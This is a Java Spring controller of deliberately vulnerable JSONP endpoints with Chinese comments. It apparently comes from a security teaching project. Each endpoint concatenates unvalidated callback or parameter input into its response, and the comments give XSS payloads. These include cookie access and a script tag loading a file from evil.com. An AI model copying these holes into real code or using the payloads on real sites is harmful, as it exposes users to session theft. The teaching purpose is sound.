package com.freedom.securitysamples.api.jsonpCallback;

import com.alibaba.fastjson.JSON;
import org.springframework.web.bind.annotation.*;
import java.util.HashMap;
import java.util.Map;

/**
 * JSONP回调注入漏洞示例控制器
 * 说明：JSONP（JSON with Padding）是一种跨域数据交互方式，通过动态创建<script>标签实现。
 *       当未对回调函数名及输入参数进行严格验证时，可能导致跨站脚本攻击（XSS），
 *       攻击者可注入恶意脚本窃取用户信息、劫持会话或执行未授权操作。
 * 常见风险：
 * 1. 跨站脚本攻击（XSS）
 * 2. 会话劫持与cookie窃取
 * 3. 敏感信息泄露
 * 4. 恶意代码执行
 * 修复原则：
 * 1. 严格验证回调函数名，仅允许字母、数字、下划线等安全字符
 * 2. 使用白名单限制合法的回调函数名
 * 3. 对输出内容进行适当编码（如HTML实体编码）
 * 4. 设置正确的Content-Type（如application/json）
 * 5. 避免在JSONP响应中包含敏感信息
 * 6. 优先使用CORS替代JSONP进行跨域通信
 */
@RestController
@RequestMapping("/security-example/jsonp-injection")
public class JsonpCallbackInjectionController {

    /**
     * 不安全示例：直接拼接未验证的callback参数
     * 漏洞点：未对回调函数名进行任何过滤，直接拼接至响应中
     * 攻击示例：
     * callback参数输入为 "<script>alert('xss')</script>"
     * 响应内容变为 "<script>alert('xss')</script>({'msg':'success'})"
     * 风险：浏览器解析时会执行注入的恶意脚本，导致XSS攻击
     */
    @GetMapping("/unsafe/direct-callback-concat")
    public String unsafeDirectCallbackConcat(String callback) {
        // 危险实践：直接拼接未过滤的callback参数
        return callback + "({'msg':'success'})";
    }

    /**
     * 不安全示例：使用格式化方法拼接未验证的callback
     * 漏洞点：虽使用String.format，但仍未对callback参数进行过滤
     * 攻击示例：
     * callback参数输入为 ");alert('xss');//"
     * 响应内容变为 ");alert('xss');//({'msg':'success'})"
     * 风险：闭合原有函数调用，注入恶意代码，导致XSS
     */
    @GetMapping("/unsafe/format-callback-concat")
    public String unsafeFormatCallbackConcat(String callback) {
        // 危险实践：格式化拼接仍存在注入风险
        return String.format("%s({'msg':'success'})", callback);
    }

    /**
     * 不安全示例：使用StringBuilder拼接未验证的callback
     * 漏洞点：无论使用何种字符串拼接方式，未过滤的callback始终存在风险
     * 攻击示例：
     * callback参数输入为 "evilFunc;document.cookie"
     * 响应内容变为 "evilFunc;document.cookie({'msg':'success'})"
     * 风险：注入可执行代码，窃取用户cookie等敏感信息
     */
    @GetMapping("/unsafe/stringbuilder-callback")
    public String unsafeStringBuilderCallback(String callback) {
        StringBuilder sb = new StringBuilder();
        // 危险实践：StringBuilder拼接同样无法避免注入
        sb.append(callback).append("({'msg':'success'})");
        return sb.toString();
    }

    /**
     * 不安全示例：JSON序列化但未校验callback
     * 漏洞点：虽对数据进行JSON序列化，但忽略了对callback参数的验证
     * 攻击示例：
     * callback参数输入为 "alert(document.domain)//"
     * 响应内容变为 "alert(document.domain)//({"msg":"success"})"
     * 风险：执行恶意函数，获取当前域名等信息，为进一步攻击做准备
     */
    @GetMapping("/unsafe/json-serialize-unchecked")
    public String unsafeJsonSerializeUnchecked(String callback) {
        Map<String, Object> result = new HashMap<>();
        result.put("msg", "success");
        // 危险实践：仅序列化数据但不验证回调函数名
        return callback + "(" + JSON.toJSONString(result) + ")";
    }

    /**
     * 不安全示例：响应体中包含未过滤的用户输入参数
     * 漏洞点：不仅callback未验证，还将其他用户输入直接拼接至响应
     * 攻击示例：
     * param参数输入为 "'});alert('xss');//"
     * 响应内容变为 "callback(''));alert('xss');//')"
     * 风险：双重注入风险，既可能通过callback注入，也可能通过其他参数注入
     */
    @GetMapping("/unsafe/response-body-unfiltered")
    @ResponseBody
    public String unsafeResponseBodyUnfiltered(String callback, String param) {
        // 危险实践：多个参数均未过滤直接拼接
        return callback + "('" + param + "')";
    }

    /**
     * 不安全示例：多参数拼接导致的注入
     * 漏洞点：多个用户可控参数直接拼接至JSONP响应中
     * 攻击示例：
     * name参数输入为 "');alert('name');//"
     * 响应内容变为 "callback({'name':'');alert('name');//','value':'xxx'})"
     * 风险：任一参数被注入都会导致攻击成功，增加了漏洞利用面
     */
    @GetMapping("/unsafe/multi-params-concat")
    public String unsafeMultiParamsConcat(String callback, String name, String value) {
        // 危险实践：多个用户输入参数直接拼接
        return callback + "({'name':'" + name + "','value':'" + value + "'})";
    }

    /**
     * 不安全示例：动态函数调用链注入
     * 漏洞点：允许动态构建函数调用链，且未对各部分进行验证
     * 攻击示例：
     * funcName参数输入为 "toString;alert(1)"
     * 响应内容变为 "callback.toString;alert(1)({'msg':'success'})"
     * 风险：可注入多个函数调用，执行复杂的恶意操作
     */
    @GetMapping("/unsafe/dynamic-function-chain")
    public String unsafeDynamicFunctionChain(String callback, String funcName) {
        // 危险实践：动态构建函数调用链且无验证
        return callback + "." + funcName + "({'msg':'success'})";
    }

    /**
     * 不安全示例：错误的HTML内容编码处理
     * 漏洞点：将HTML内容直接返回而未进行适当编码
     * 攻击示例：
     * 响应中包含未转义的<script>标签，即使callback安全也会导致XSS
     * 风险：直接执行恶意脚本，无需通过callback注入
     */
    @GetMapping("/unsafe/html-content-unescaped")
    public String unsafeHtmlContentUnescaped(String callback) {
        String result = "<script>alert(1)</script>";
        // 危险实践：返回未编码的HTML内容
        return callback + "('" + result + "')";
    }

    /**
     * 不安全示例：缺少Content-Type限制
     * 漏洞点：未指定正确的Content-Type，浏览器可能以不当方式解析响应
     * 攻击示例：
     * 结合其他注入点，可构造伪装成HTML/JavaScript的响应
     * 风险：增加XSS攻击成功率，浏览器可能忽略部分安全限制
     */
    @GetMapping("/unsafe/missing-content-type")
    public String unsafeMissingContentType(String callback) {
        // 危险实践：未设置Content-Type为application/json或application/javascript
        return callback + "(" + System.getProperty("user.dir") + ")";
    }

    /**
     * 不安全示例：动态引入外部资源
     * 漏洞点：将用户输入的URL直接返回，可能被用于引入恶意资源
     * 攻击示例：
     * url参数输入为 "');document.write('<script src=https://evil.com/xss.js></script>');//"
     * 风险：加载外部恶意脚本，执行更复杂的攻击逻辑
     */
    @GetMapping("/unsafe/dynamic-external-resource")
    public String unsafeDynamicExternalResource(String callback, String url) {
        // 危险实践：直接使用用户提供的URL构建响应
        return callback + "('" + url + "')";
    }
}